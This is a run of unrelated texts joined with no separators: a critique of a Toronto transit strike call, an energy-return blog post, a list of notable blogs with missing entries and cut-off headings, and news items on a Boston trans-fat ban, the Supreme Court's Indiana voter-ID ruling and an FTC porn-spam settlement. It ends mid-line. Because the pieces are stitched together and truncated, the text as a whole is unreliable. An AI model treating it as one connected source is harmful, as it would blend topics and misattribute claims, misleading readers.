And it would have had to link the fears of layoffs and outsourcing felt by the union membership and the related fare price hikes and the starving of funds to the city ’s transit system with resistance to the ongoing assault on public and social services that has become the hallmark of municipal and provincial governments throughout the country — not to mention the Harper Conservative government in Ottawa .
Rather , Kinnear ’s ill - prepared Friday night strike call was meant to punish a rebellious membership and those opponents within his own executive and prove to them in no uncertain terms that a strike was unwinnable .
And just to drive home the point , Kinnear facilitated the record - time passage of strikebreaking legislation by creating chaotic conditions in Toronto on Friday night that quickly became the grist for the mill for every right - wing newspaper columnist and talk - radio demagogue in the Greater Toronto Area .
It was as if Kinnear had said to his membership , “ OK .
You want a strike ?
You got one .
But you ’ll be sorry . ”
The fearful expressions on the faces of ticket booth collectors and station attendants as they were ordered to move patrons out of the stations and bar the doors , often in the midst of inebriated crowds , late Friday night gave the lie to Kinnear ’s claims to be concerned about the safety of his membership .
Transit workers interviewed on Saturday expressed dissatisfaction with the timing of the strike call .
Why , they wondered , was the strike called , out of the blue , and at midnight ?
People were stranded .
The public would be angered , particularly in the face of the Local Executive ’s reneging on its 48 - hour promise .
The subway system was to close for the night in two more hours .
Why not wait , at least until then ?
This is indeed a good question .
Certainly , Kinnear did not have a grand strategy for winning a strike with lightning tactics .
He had worked feverishly to end a one - day wildcat strike in 2006 , again begun by workers in the depots who took action against arbitrary shift changes .
He offered no advice or strategy on mobilizing against the back - to - work legislation that was sure to come .
But , by calling the strike as soon as the votes had been counted Friday night , he ensured that , even if the general public would be severely inconvenienced over their weekend , the government would have plenty of time to ensure that big business could get its workers in for Monday morning .
The hue and cry over Kinnear ’s debacle will now be used to whip up support for legislation designed to completely strip transit workers by making the TTC an “ essential service . ”
Premier McGuinty has already said his government will consider widening the province ’s definition of essential services to strip the TTC workers , and possibly other public and private sector workers , of the right to strike .
Tomorrow we will highlight another in a series of analysis on Energy Return on ( Energy ) Investment .
Though measuring an energy projects profit and cost in terms of energy is very important , all energy sources are not the same , and the word ' alternative ' does not connote ' equality ' .
In effect , quality matters .
Despite some attractive substitutes to oil and gas from an energy return perspective , ALL fuel sources are now heavily subsidized by an infrastructure built and maintained by cheap and constantly available liquid fuels .
Global oil depletion is not immune to the Law of Receding Horizons , the Law of Diminishing Marginal Returns , nor it seems to the Law of Unintended Consequences .
The Grangemouth refinery shutdown has apparently caused work on a new wind farm in Scotland to shut down for lack of diesel fuel .
Though at this stage this is a short - term snafu , it 's a real time example of how lack of systems analysis of our energy problem will lead to unanticipated problems .
MORE than 100 construction workers could face the dole after the fuel crisis brought their project to a halt .
The drivers for Glasgowbased AB2000 were grounded at the new wind farm at Fenwick Moor , Ayrshire , on Thursday after contractors Morrison Construction were unable to find more diesel .
The job was restarted on Friday but bosses fear the limited fuel supply will soon run out and lead to job cuts .
Ted Reilly , of AB2000 , said : " We have 70 - odd vehicles stuck there because we are hiring men and vehicles to a contractor which can't supply diesel .
That situation can't go on any longer .
In the comment section of theoildrums coverage of the Grangemouth refinery shutdown , we find that a diesel shortage has caused construction to stop on a $ 300 million wind farm .( hat tip to Undertow )
This highlights an ongoing theme discussed on this website about wide boundaries and energy quality .
We need energy to perform work .
How we define ' work ' is dependent upon how our society is structured .
A handful of decades ago , crude oil , despite being extremely powerful and right under their feet , would not have meant much to Saud tribespeople in the Arabian desert , who valued fast , healthy horses as the ' energy quality ' that powered their society .
Similarly , today we are utterly dependent on crude oil and its refined end products of gasoline , diesel fuel , jet fuel and heating oil .

Water , water everywhere but not a drop to drink
There are large amounts of solar energy hitting the planet .
The potential scale of alternative energy is massive ( at least when measured in its unharnessed state ) .
It IS possible to replace a fossil fuel infrastructure with nuclear , wind , solar , hydro , etc . but we will need a 20 year headstart and a change in the demand system .
Just like most people were unaware of how much systemic risk existed in the financial markets until recently , there is similar unquantified systemic risk in the energy markets .
We need diesel fuel , cheaply and consistently available to move parts and components around for wind tubines and solar panel production .
We need large amounts of natural gas and electricity to produce crude oil .
We need well maintained asphalt roads and clean drinking water and municipal infrastrucuture to keep employees moving to their jobs at alternative energy manufacture .
We need hospitals and healthy insurance companies for employees to feel secure and safe in their jobs , etc .
There are many many interconnected threads within modern society that all link back to cheap oil and gas .
A great concern of mine is the likelihood of falling into the " Tragedy of the Energy Investing Commons " .
As the energy crisis deepens , more money , expertise and resources will be thrown at any energy alternative that produces energy , irrespective of its quality , density , energy surplus or environmental impacts .
Many of these technologies will be dead ends ( energy sinks ) .
Many will produce some energy .
Some will procure new forms of energy valuable to future society , and at meaningful scale .
However , all will drain resources , both liquid fuels and non-energy inputs away from non-energy society .
If their energy contributions are marginal , or of differing quality than we depend on , this will accelerate the usage of our remaining high quality fossil stocks .
The wind farm in Scotland will undoubtedly restart once the shortages are over , but this example highlights how systemic our energy systems are .
If energy production / consumption was well - diversified , and / or redundant , a shortage in diesel would not lead to problems with wind turbine construction .
At what point does time become as limiting an input as crude oil ?
Until we can make wind turbines from wind , this civilization may be increasingly subject to Murphy 's Law .

1. The Huffington Post
The history of political blogging might usefully be divided into the periods pre- and post -Huffington .
Before the millionaire socialite Arianna Huffington decided to get in on the act , bloggers operated in a spirit of underdog solidarity .
They hated the mainstream media - and the feeling was mutual .
Bloggers saw themselves as gadflies , pricking the arrogance of established elites from their home computers , in their pyjamas , late into the night .
So when , in 2005 , Huffington decided to mobilise her fortune and media connections to create , from scratch , a flagship liberal blog she was roundly derided .
Who , spluttered the original bloggerati , did she think she was ?
But the pyjama purists were confounded .
Arianna 's money talked just as loudly online as off , and the Huffington Post quickly became one of the most influential and popular journals on the web .
It recruited professional columnists and celebrity bloggers .
It hoovered up traffic .
Its launch was a landmark moment in the evolution of the web because it showed that many of the old rules still applied to the new medium : a bit of marketing savvy and deep pockets could go just as far as geek credibility , and get there faster .
To borrow the gold - rush simile beloved of web pioneers , Huffington 's success made the first generation of bloggers look like two - bit prospectors panning for nuggets in shallow creeks before the big mining operations moved in .
In the era pre-Huffington , big media companies ignored the web , or feared it ; post - Huffington they started to treat it as just another marketplace , open to exploitation .
Three years on , Rupert Murdoch owns MySpace , while newbie amateur bloggers have to gather traffic crumbs from under the table of the big - time publishers .

2. Boing Boing
Lego reconstructions of pop videos and cakes baked in the shape of iPods are not generally considered relevant to serious political debate .
But even the most earnest bloggers will often take time out of their busy schedule to pass on some titbit of mildly entertaining geek ephemera .
No one has done more to promote pointless , yet strangely cool , time - wasting stuff on the net than the editors of Boing Boing ( subtitle : A Directory of Wonderful Things ) .
It launched in January 2000 and has had an immeasurable influence on the style and idiom of blogging .
But hidden among the pictures of steam - powered CD players and Darth Vader tea towels there is a steely , ultra-liberal political agenda : championing the web as a global medium free of state and corporate control .
Boing Boing chronicles cases where despotic regimes have silenced or imprisoned bloggers .
It helped channel blogger scorn on to Yahoo and Google when they kowtowed to China 's censors in order to win investment opportunities .
It was instrumental in exposing the creeping erosion of civil liberties in the US under post - 9/11 ' Homeland Security ' legislation .
And it routinely ridicules attempts by the music and film industries to persecute small - time file sharers and bedroom pirates instead of getting their own web strategies in order .
It does it all with gentle , irreverent charm , polluted only occasionally with gratuitous smut .
Their dominance of the terrain where technology meets politics makes the Boing Boing crew geek aristocracy .

Business Week named Arrington one of the 25 most influential people on the web , and Techcrunch has even scored interviews with Barack Obama and John McCain .
With a horde of hungry geeks and big money investors online , Techcrunch is the largest of a wave of technology - focused blog publishers to tap into the market - GigaOm , PaidContent and Mashable among them - but often proves more contentious than its rivals , thanks to Arrington 's aggressive relationships with traditional media and his conflicts of interest as an investor himself .

4. Kottke
One of the early wave of blogging pioneers , web designer Jason Kottke started keeping track of interesting things on the internet as far back as 1998 .
The site took off , boosted partly through close links to popular blog - building website Blogger ( he later married one of the founders ) .
And as the phenomenon grew quickly , Kottke became a well - known filter for surfers on the lookout for interesting reading .
Kottke remains one of the purest old - skool bloggers on the block - it's a selection of links to websites and articles rather than a repository for detailed personal opinion - and although it remains fairly esoteric , his favourite topics include film , science , graphic design and sport .
He often picks up trends and happenings before friends start forwarding them to your inbox .
Kottke 's decision to consciously avoid politics could be part of his appeal ( he declares himself ' not a fan ' ) , particularly since the blog 's voice is literate , sober and inquiring , unlike much of the red - faced ranting found elsewhere online .
A couple of key moments boosted Kottke 's fame : first , being threatened with legal action by Sony for breaking news about a TV show , but most notably quitting his web - design job and going solo three years ago .
A host of ' micropatrons ' and readers donated cash to cover his salary , but these days he gets enough advertising to pay the bills .
He continues to plug away at the site as it enters its 10th year .

5. Dooce
One of the best - known personal bloggers ( those who provide more of a diary than a soapbox or reporting service ) , Heather Armstrong has been writing online since 2001 .
Though there were personal websites that came before hers , certain elements conspired to make Dooce one of the biggest public diaries since Samuel Pepys 's ( whose diary is itself available , transcribed in blog form , at Pepysdiary.com ) .
Primarily , Armstrong became one of the first high - profile cases of somebody being fired for writing about her job .
After describing events that her employer - a dotcom start - up - thought reflected badly on them , Armstrong was sacked .
The incident caused such fierce debate that Dooce found itself turned into a verb that is used in popular parlance ( often without users realising its evolution ) : ' dooced - to be fired from one 's job as a direct result of one 's personal website ' .
Behind Dooce stands an army of personal bloggers perhaps not directly influenced by , or even aware of , her work - she represents the hundreds of thousands who decide to share part of their life with strangers .
Armstrong 's honesty has added to her popularity , and she has written about work , family life , postnatal depression , motherhood , puppies and her Mormon upbringing with the same candid and engaging voice .
Readers feel that they have been brought into her life , and reward her with their loyalty .
Since 2005 the advertising revenue on her blog alone has been enough to support her family .

6. Perezhilton
Once dubbed ' Hollywood 's most hated website ' , Perezhilton ( authored by Mario Lavandeira since 2005 ) is the gossip site celebrities fear most .
Mario , 29 , is famous for scrawling rude things ( typically doodles about drug use ) over pap photos and outing closeted stars .
On the day of Lindsay Lohan 's arrest for drink - driving , he posted 60 updates , and 8 m readers logged on .
He 's a shameless publicity whore , too .
His reality show premiered on VH1 last year , and his blogsite is peppered with snaps of him cuddling Paris Hilton at premieres .
Fergie from Black Eyed Peas alluded to him in a song , and Avril Lavigne phoned , asking him to stop writing about her after he repeatedly blogged about her lack of talent and her ' freakishly long arm ' .

7 . Talking points memo
At some point during the disputed US election of 2000 - when Al Gore was famously defeated by a few hanging chads - Joshua Micah Marshall lost patience .
Despite working as a magazine editor , Marshall chose to vent on the web .
Eight years later Talking Points Memo and its three siblings draw in more than 400,000 viewers a day from their base in New York .
Marshall has forged a reputation , and now makes enough money to run a small team of reporters who have made an impact by sniffing out political scandal and conspiracy .
' I think in many cases the reporting we do is more honest , more straight than a lot of things you see even on the front pages of great papers like the New York Times and the Washington Post , ' he said in an interview last year .
' But I think both kinds of journalism should exist , should co-exist . '
Although his unabashed partisan approach is admonished by many old - fashioned American reporters , Marshall 's skills at pulling together the threads of a story have paid dividends .
Last year he helped set the agenda after George Bush covertly fired a string of US attorneys deemed disloyal to the White House .
While respected mainstream media figures accused Marshall of seeing conspiracy , he kept digging : the result was the resignation of attorney general Alberto Gonzales , and a prestigious George Polk journalism award for Marshall , the first ever for a blogger .

8. Icanhascheezburger
Amused by a photo of a smiling cat , idiosyncratically captioned with the query ' I Can Has A Cheezburger ? ' , which he found on the internet while between jobs in early 2007 , Eric Nakagawa of Hawaii emailed a copy of it to a friend ( known now only as Tofuburger ) .
Then , on a whim , they began a website , first comprising only that one captioned photo but which has since grown into one of the most popular blogs in the world .
Millions of visitors visit Icanhascheezburger.com to see , create , submit and vote on Lolcats ( captioned photos of characterful cats in different settings ) .
The ' language ' used in the captions , which this blog has helped to spread globally , is known as Lolspeak , aka Kitty Pidgin .
In Lolspeak , human becomes ' hooman ' , Sunday ' bunday ' , exactly ' xackly ' and asthma ' azma ' .
There is now an effort to develop a LOLCode computer - programming language and another to translate the Bible into Lolspeak .

9. Beppe Grillo
Among the most visited blogs in the world is that of Beppe Grillo , a popular Italian comedian and political commentator , long persona non grata on state TV , who is infuriated daily - especially by corruption and financial scandal in his country .
A typical blog by Grillo calls , satirically or otherwise , for the people of Naples and Campania to declare independence , requests that Germany declare war on Italy to help its people ( ' We will throw violets and mimosa to your Franz and Gunther as they march through ' ) or reports on Grillo 's ongoing campaign to introduce a Bill of Popular Initiative to remove from office all members of the Italian parliament who 've ever had a criminal conviction .
Grillo's name for Mario Mastella , leader of the Popular - UDEUR centre - right party , is Psychodwarf .
' In another country , he would have been the dishwasher in a pizzeria , ' says Grillo .
Through his blog , he rallied many marchers in 280 Italian towns and cities for his ' Fuck You ' Day last September .

10 . Gawker
A New York blog of ' snarky ' gossip and commentary about the media industry , Gawker was founded in 2002 by journalist Nick Denton , who had previously helped set up a networking site called First Tuesday for web and media entrepreneurs .
Gawker 's earliest fascination was gossip about Vogue editor Anna Wintour , garnered from underlings at Conde Nast .
This set the tone for amassing a readership of movers and shakers on the Upper East Side , as well as ' the angry creative underclass ' wishing either to be , or not be , like them , or both ( ' the charmingly incompetent X... the wildly successful blowhard ' ) .
Within a year Gawker 's readers were making 500,000 page views per month .
Nowadays the figure is 11 m , recovering from a recent dip to 8 m thanks to the showing of a Tom Cruise ' Indoctrination Video ' which Scientologists had legally persuaded YouTube to take down .
Gawker remains the flagship of Gawker Media , which now comprises 14 blogs , although gossiping by ex-Gawker insiders , a fixation on clicks ( which its bloggers are now paid on the basis of ) and fresh anxiety over defining itself have led some to claim Gawker has become more ' tabloidy ' and celeb - and It - girl - orientated , and less New York - centric .
But its core value - ' media criticism ' - appears to be intact .

11 . The Drudge Report
The Report started life as an email gossip sheet , and then became a trashy webzine with negligible traffic .
But thanks to the decision in 1998 to run a scurrilous rumour – untouched by mainstream media – about Bill Clinton and a White House intern named Monica Lewinsky , it became a national phenomenon .
Recent scoops include Barack Obama dressed in tribal garb and the fact Prince Harry was serving in Afghanistan .
Drudge is scorned by journalists and serious bloggers for his tabloid sensibilities , but his place in the media history books is guaranteed .
And much though they hate him , the hacks all still check his front page – just in case he gets another president - nobbling scoop .

12 . Xu Jinglei
Jinglei is a popular actress ( and director of Letter From An Unknown Woman ) in China , who in 2005 began a blog ( ' I got the joy of expressing myself ' ) which within a few months had garnered 11.5 m visits and spurred thousands of other Chinese to blog .
In 2006 statisticians at Technorati , having previously not factored China into their calculations , realised Jinglei 's blog was the most popular in the world .
In it she reports on her day - to - day moods , reflections , travels , social life and cats ( ' Finally the first kitten 's been born !!!
Just waiting for the second , in the middle of the third one now !!!!!!!!
It 's midnight , she gave birth to another one !!!!!!') .
She blogs in an uncontroversial but quite reflective manner , aiming to show a ' real person ' behind the celebrity .
Each posting , usually ending with ' I have to be up early ' or a promise to report tomorrow on a DVD she is watching , is followed by many hundreds of comments from readers – affirming their love , offering advice , insisting she take care .
Last year her blog passed the 1bn clicks mark .

15 . TMZ
You want relentless celebrity gossip on tap ?
TMZ will provide it , and when we say relentless , we mean relentless .
The US site is dripping with ' breaking news ' stories , pictures and videos , and deems celeb activity as mundane as stars walking to their cars worthy of a video post .
TMZ was launched in 2005 by AOL and reportedly employs around 20 writers to keep the celeb juice flowing .
It pulls in 1.6 m readers a month and is endlessly cited as the source for red - top celeb stories .
It was the first to break Alec Baldwin 's now infamous ' rude little pig ' voicemail last April , for instance .
TMZ prides itself on being close to the action , so close , in fact , a TMZ photographer had his foot run over by Britney Spears mid-meltdown .
They auctioned the tyre - tracked sock on eBay in aid of US charity the Children 's Defense Fund last autumn .

The world 's most popular blog on gadgets and consumer electronics , Engadget was founded by Peter Rojas in 2004 and won the Web Blogs Awards that year and each year since .
Now part of Weblogs Inc ( owned by AOL ) , it is offered on many other sites ( including GoogleMail ) as a default RSS feed , and is published in English , Spanish , Japanese and Chinese .
Last year , a mistake confirmed Engadget 's power - upon reporting a supposed email ( which turned out to be a hoax ) from Apple , informing Apple employees of a delay in the launch of iPhone , Apple 's share price fell by 3 per cent within minutes .
Rojas also co-founded rival gadget blog Gizmodo .

17 . Marbury
No matter what happens between now and 4 November , you can be certain the US presidential election of 2008 will be among the most historically important and dramatic of any fought .
Having an informed opinion will be a must , but if you are as yet unable to tell your Iowa Caucus from your Feiler Faster Thesis , Marbury – a British blog on American politics – is the place to start .
The site 's creator , Ian Leslie , is an ex-expat who fell for American politics during a four - year stint living in New York .
The site signposts important events and interesting analyses , gives context and witty commentary on everything from the most serious speeches to the silliest election - themed YouTube clips .
And West Wing fans will be pleased to note that the blog 's name is a reference to the show 's British ambassador to the United States , Lord John Marbury , who , appropriately enough , provided an eccentrically British but reliably insightful appraisal of American politics .

20 . The Sartorialist
As ideas go , this one is pretty simple .
Man wanders around Manhattan with a camera .
Spots someone whose outfit he likes .
Asks if he can take a picture .
Goes home and posts it on his blog .
But the man in question is Scott Schuman , who had 15 years ' experience working at the high - fashion end of the clothing industry before starting The Sartorialist .
He 's got a sharp eye for a good look , a gift for grabbing an on - the - hoof pic and an unwavering enthusiasm for people going the extra mile in the name of style .
Minimalist it might be , but his site – a basic scroll of full - length street portraits , occasionally annotated with a brief note – is mesmeric and oddly beautiful .
The site attracts more than 70,000 readers a day and has been named one of Time 's Top 100 Design Influences .
So if you 're out and about and a guy called Scott asks to take your picture , just smile .
You 're about to become a style icon .

21 . Students for a free Tibet
Taking the protest online , Students for a Free Tibet ( SFT ) is a global , grassroots network of students campaigning to free Tibet , which has been occupied by China since 1950 .
Students in Tibet face arrest for posting on the site , but many escape to blog about their experiences in exile .
With a history of direct action , the group is now uniting worldwide members through the web , blogging to spread word of news and protests , and using sites like Facebook to raise funds .
The organisation , which was founded in 1994 in New York , spans more than 35 countries and gets up to 100,000 hits a month .
In 2006 , SFT used a satellite link at Mount Everest base camp to stream live footage on to YouTube of a demonstration against Chinese Olympic athletes practising carrying the torch there .
Later this year the web will be a critical tool in organising and reporting protests during the games .
'SFT plans to stage protests in Beijing during the games and post blogs as events unfold , ' says Iain Thom , the SFT UK national co-ordinator .
' But for security reasons we can't reveal details of how or where yet . '
Similarly , a massive protest in London on 10 March will be the subject of intense cyber comment .
In response , the site has fallen victim to increasingly sophisticated cyber attacks .
Investigations have traced the sources back to China , leading to speculation that the Chinese authorities are trying to sabotage the site to stop online critics .

22 . Jezebel
Last year Gawker Media launched Jezebel – a blog which aimed to become a brilliant version of a women 's magazine .
It succeeded quickly , in part by acknowledging the five big lies perpetuated by the women 's media : The Cover Lie ( female forgeries of computer - aided artistry ) ;
The Celebrity - Profile Lie ( flattery , more nakedly consumerist and less imaginative than the movies they 're shilling for ) ; The Must - Have Lie ( magazine editors are buried in free shit ) ;
The Affirmation Crap Lie ( you are insecure about things you did n't know it was possible to be insecure about ) ; and The Big Meta Lie ( we 're devastatingly affected by the celebrity media ) .
Their regular ' Crap Email From a Dude ' feature is especially fantastic , as is their coverage of current stories ( opinionated and consistently hilarious ) and politics .
It offers the best lady - aimed writing on the web , along with lots of nice pictures of Amy Winehouse getting out of cars .

Following in the footsteps of Belle de Jour – the anonymous blogger claiming to be a sex worker – the girl with a one track mind started writing in open , explicit terms about her lively sex life in 2004 .
By 2006 , the blog was bookified and published by Ebury , and spent much time on bestseller lists , beach towels and hidden behind the newspapers of serious - looking commuters .
Though she was keen to retain her anonymity and continue her career in the film industry , author ' Abby Lee ' was soon outed as north Londoner Zoe Margolis by a Sunday newspaper .

Thousands of women tune in for daily accounts of her narcissistic husband and nightmarish mother - in - law and leave equally self - revealing comments transforming the pages into something of a group confessional .
The blog has been so successful that Klein has penned a book , Straight Up and Dirty , and has featured in countless magazine and newspaper articles around the globe .

27 . Holy Moly
If a weekly flick through Heat just is n't enough , then a daily intake of Holy Moly will certainly top up those celeb gossip levels .
The UK blog attracts 750,000 visitors a month and 240,000 celeb - obsessees subscribe to the accompanying weekly mail - out .
It 's an established resource for newspaper columnists – both tabloid and broadsheet – and there 's a daily ' News from the Molehill ' slot in the free London paper The Metro .
Last month Holy Moly created headlines in its own right by announcing a rethink on publishing paparazzi shots .
The blog will no longer publish pics obtained when ' pursuing people in cars and on bikes ' , as well as ' celebrities with their kids ' , ' people in distress at being photographed ' and off - duty celebs .
But do n't think that means the omnipresent celeb blog that sends shivers round offices up and down the country on ' mail - out day ' is slowing down – there has been talk of Holy Moly expanding into TV .

Her main theme is how liberals betray America by being soft on terrorism , peddling lies about global warming and generally lacking patriotism and moral fibre .

Go fug yourself
It 's a neat word , fug – just a simple contraction of ' ugly ' and its preceding expletive – but from those three letters an entire fugging industry has grown .
At Go Fug Yourself , celebrity offenders against style , elegance and the basic concept of making sure you 're covering your reproductive organs with some form of clothing before you leave the house are ' fugged ' by the site 's writers , Jessica Morgan and Heather Cocks .
In their hands , the simple pleasure of yelping ' Does she even OWN a mirror ? ' at a paparazzi shot of some B - list headcase in fuchsia becomes an epic battle against dull Oscar gowns , ill - fitting formalwear and Lindsay Lohan 's leggings .
The site stays on the right side of gratuitous nastiness by dishing out generous praise when due ( the coveted ' Well Played ' ) , being genuinely thoughtful on questions of taste and funnier on the subject of random starlets in sequined sweatpants than you could possibly even imagine .

Things started going gangbusters when he pimped his cartoons on the internet , and as he built an audience through his blog , he started writing about his other passion – the new world of understanding how to adapt marketing to the new world of the net .
Remember when everybody was madly printing off vouchers from the web that saved you 40 per cent ?

If someone stole your camera , took it out for the night to parties you yourself are n't cool enough to go to and returned it in the morning , you would probably find it loaded up with pictures like those posted on DirtyDirtyDancing .
The site seems pretty lo -fi – just entries called things like ' Robin 's birthday ' and ' FEB16 ' featuring pages of images of hip young things getting their party on .
And that 's it .
The original delight was in logging on to see if you 'd made it on to the site – your chances increase exponentially if you 're beautiful , avant - garde and hang out at clubs and parties in the edgier parts of London – but now the site can get up to 900,000 hits a month from all over the world .

With a title pulled from Immanuel Kant 's famous statement that ' out of the crooked timber of humanity , no straight thing was ever made ' , it 's an amalgam of academic and political writing that has muscled its way into the epicentre of intelligent discussion since its conception in 2003 .
Formed as an internet supergroup , pulling several popular intellectual blogs together , Crooked Timber now has 16 members – largely academics – across the US , Europe , Australia and Asia .
The site has built itself a reputation as something of an intellectual powerhouse ; a sort of global philosophical thinktank conducted via blog .

The offside
Launched by ' Bob ' after the success of his WorldCupBlog in 2006 , Offside is a UK - based blog covering football leagues globally , gathering news and visuals on all of it , inviting countless match reports and promoting discussion on all things soccer , from the attack by a colony of red ants on a player in the Sao Paulo state championship third division , to the particular qualities of every one of Cristiano Ronaldo 's goals so far this season .
Considered by many to be the best ' serious ' blog in the game , it nevertheless promises irreverently , ' If there is a sex scandal in England , we 'll be stuck in the middle of it .
If a player is traded for 1,000lb of beef in Romania , we 'll cook the steak .

36 . Peteite Anglaise
The tagline of a new book hitting British shelves reads ' In Paris , in love , in trouble ' , but if it were telling the whole story , perhaps it should read ' In public ' too .
Bored at work one day in 2004 , expat secretary Catherine Sanderson happened upon the concept of blogging .
With a few clicks and an impulse she created her own blog , and quickly gathered fans who followed her life in Paris , the strained relationship with her partner and adventures with her toddler .
And there was plenty of drama to watch : within a year her relationship had broken up , and she 'd met a new man who wooed her online .
Readers were mesmerised by her unflinching dedication to telling the whole story , no matter how she would be judged .
Soon afterwards , however , Sanderson 's employers found out about the blog and promptly fired her .
Defeat turned into victory , however , with the press attention she gathered from the dismissal not only securing victory in an industrial tribunal , but also helping her score a lucrative two - book deal with Penguin .

For Clothilde Dusoulier , a young woman working in computing and living in the Paris district of Montmartre , starting a blog was a way of venting her boundless enthusiasm for food without worrying she might be boring her friends with it .
Five years later Chocolate and Zucchini , one of the most popular cooking blogs , has moved from being a hobby to a full - time career .
The mixture of an insider 's view on gastronomic Paris , conversational , bilingual writing and the sheer irresistibility of her recipes pull in thousands of readers every day .
This , in turn , has led to multiple books and the ability to forge a dream career as a food writer .
The name of the blog is , she says , a good metaphor for her cooking style : ' The zucchini illustrates my focus on healthy and natural eating ... and the chocolate represents my decidedly marked taste for anything sweet . '

42 . Jonny B's private secret diary
Growing in popularity since its debut in 2003 , Jonny B's diary – which is clearly neither private nor terribly secret – catalogues the rock and bowls lifestyle of one man in the depths of rural Norfolk .
With the mocking self - awareness of a modern Diary of a Nobody , the author tells tales of wild nights at the village pub and the fortunes of the local bowls team .
As a slow , gentle satire on modern village life , it is often held up as an example of blog as sitcom , and has not only attracted a loyal band of readers , but a dedicated fan club on Facebook desperate to work out the real identity of the wit behind the site .
Previous guesses have included Chris Evans and Johnny Vaughan , though both have been strenuously denied .

Rant is n't quite the right word for this collection of carefully crafted stories from the sharp end of the service industry in a busy New York restaurant .
' The Waiter ' , as the author is known , has been blogging his experiences with fussy customers and bad tippers since 2004 , winning a gong at blogging 's biggest awards , the Bloggies , in 2007 .
It 's representative – but by no means the first – of the so - called ' job - blogs ' , with people from all walks of life , from ambulance drivers ( randomactsofreality.net ) and policemen ( coppersblog.blogspot.com ) to the greatly loved but now defunct Call Centre Confidential .
Between them they chronicle life in their trade , and usually from behind a veil of anonymity .
Something about the everyday nature of The Waiter – a person we like to pretend is invisible or treat with servile disdain – deconstructing the event later with a subtle , erudite typestroke , has captured the public imagination and ( hopefully ) made some people behave better in restaurants than they otherwise might .

Now banned in Boston : artery - clogging trans fat .
The city 's health board gave final , unanimous approval yesterday to a ban on the artificial substance in french fries , doughnuts , and other dishes made in restaurants and grocery stores .
" It 's the right thing to do , " said Harold Cox , a member of the Boston Public Health Commission .
Boston joins a growing number of cities , including New York and Philadelphia , and the town of Brookline in banning the ingredient .
Trans fat has been linked to heart disease in humans and to diabetes in experimental animals .
The first phase of the ban goes into effect in September and will apply to the use of cooking oils , shortening , and margarine containing artificial trans fat .
The makers of baked goods will have a year to eliminate trans fat from their products .
Packaged goods clearly labeled as containing the substance can still be sold , although most major manufacturers have already removed it .
The Boston prohibition would cover all restaurants , including school and hospital cafeterias , as well as fresh food prepared in groceries and delis .
City inspectors will visit businesses to make sure they comply with the ban , and scofflaws could face fines of up to $ 1,000 for each violation .
The prohibition faced only scant opposition .
Of more than 90 written comments , only three were antagonistic .
And when the Health Commission held a public hearing yesterday on the ban , only four people showed up .
Janine M. Harrod , director of government affairs for the Massachusetts Restaurant Association , said members of the trade group were worried they could roll up multiple fines if an inspector found , say , several products containing artificial trans fat .
But a commission attorney stressed that regulators do not intend to be punitive and promised instead to work with chefs to cook up dishes free of trans fats .

WASHINGTON ( Reuters ) - The Supreme Court on Monday upheld a tough state law requiring voters to show photo identification , a decision critics say could keep some blacks , poor people and other traditional Democratic supporters from voting in the November election .

Resolving a partisan political battle , the country ’s high court voted 6 - 3 to reject a legal challenge by Democrats that Indiana ’s toughest - in - the - nation voter identification law would deter minorities , the elderly and others from casting ballots .
The main opinion agreed with Republican supporters that the law was necessary to prevent voter fraud and safeguard public confidence in the integrity of elections .
The Bush administration supported the law .
The court handed down the ruling just eight days before the crucial Indiana presidential primary election featuring Democratic candidates Barack Obama and Hillary Clinton .
If elected in November , Obama would be the first black U.S. president , while Clinton would be the first female U.S. president .
“ The effect of the loss ... will begin to be felt next week when Indiana holds its presidential primary using the voter ID law the court has just upheld , ” said Nathaniel Persily , an election law expert at Columbia University in New York .
The decision could have broad national significance because more than 20 states have adopted voter identification laws and other states are considering similar legislation .
The law requires a government - issued photo ID such as a driver ’s license to vote in federal , state and local elections .
Indiana Secretary of State Todd Rokita , a Republican , said the timing of the ruling was good because it was the first time since 1968 that Indiana ’s presidential primary had mattered and voter registrations had surged this year .
In seven elections since Indiana put the law into place , the requirement “ has n’t been an issue , ” based on complaints to his office , Rokita said .
Reaction to the ruling split along political lines .
“ This decision not only confirms the validity of photo ID laws but it completely vindicates the Bush Justice Department ” when it approved a similar Georgia law , said former department official Hans von Spakovsky .
Democrats sharply criticized the ruling .
DENIES A FUNDAMENTAL RIGHT
“ Denying a fundamental right -- the right to vote -- because a person is indigent , lacks a birth certificate or has no access to a vehicle goes against America ’s better values , ” Sen. Patrick Leahy of Vermont said .
Angela Ciccolo of the NAACP civil rights group said the law would have its greatest impact on voters who are poor , elderly , belong to racial minorities or have disabilities .
The lead opinion , written by Justice John Paul Stevens and joined by Chief Justice John Roberts and Justice Anthony Kennedy , held the evidence in the record did not support an attack now on the law ’s validity .
Three other court members -- conservative Justices Antonin Scalia , Clarence Thomas and Samuel Alito , concurred in the judgment and issued a separate opinion that the law should be upheld because its overall burden was minimal and justified .
Stevens wrote that states had a “ valid interest in protecting the integrity and reliability of the electoral process . ”
He said voter fraud “ could affect the outcome of a close election . ”
He said the law may place a small burden on a limited number of people -- the elderly born out - of - state who may have difficulty in getting the required documents , the homeless or people with a religious objection to being photographed .
Stevens said politics may have been a factor in adopting the law but that alone did not make it unconstitutional .
His opinion left open the possibility of future legal challenges by specific voters .
Justices David Souter , Ruth Bader Ginsburg and Stephen Breyer dissented .
Souter said the law threatened to impose major burdens on the voting rights of tens of thousands of Indiana residents , especially the poor and the elderly .

Warning : stick figure porn ahead . )
Exposing unwitting users to pornography is a no - no , and the FTC has cracked down on at least one X - rated company for doing exactly that with its bulk e-mail marketing .
Cyberheat , Inc. was originally sued in 2005 by the FTC for violating federal laws on " Adult Labeling " in addition to violations of the 2003 CAN - SPAM act .
According to the Adult Labeling law , commercial e-mailers of sexually - explicit materials must prefix their e-mail subject lines with " SEXUALLY EXPLICIT : " so that the user can identify the content before opening the message .
And of course , according to CAN - SPAM , bulk e-mailers must provide a way for consumers to opt - out — something that most sex - related spam does n't offer .
Original image
Some relatively work - safe porn spam
Cyberheat did n't actually send out the e-mail itself , though — the company hired affiliate marketers to do it instead .
Still , the FTC held Cyberheat responsible for the violations because Cyberheat " induced [ the affiliates ] to send it by offering to pay those who successfully attracted subscribers to its Web sites . "
Today , the company agreed to settle the lawsuit and pay the FTC $ 413,000 in civil penalties .
It will also closely monitor its affiliates to ensure their future compliance .
This is n't the first X - rated company to get hit with a lawsuit from the FTC .
In addition to Cyberheat , the commission sued six other companies in 2005 for the same reasons — five of which settled between then and now .
The FTC says that with Cyberheat 's " contribution , " the combined civil penalties paid by these companies have come to over $ 1.6 million .

NEW YORK --
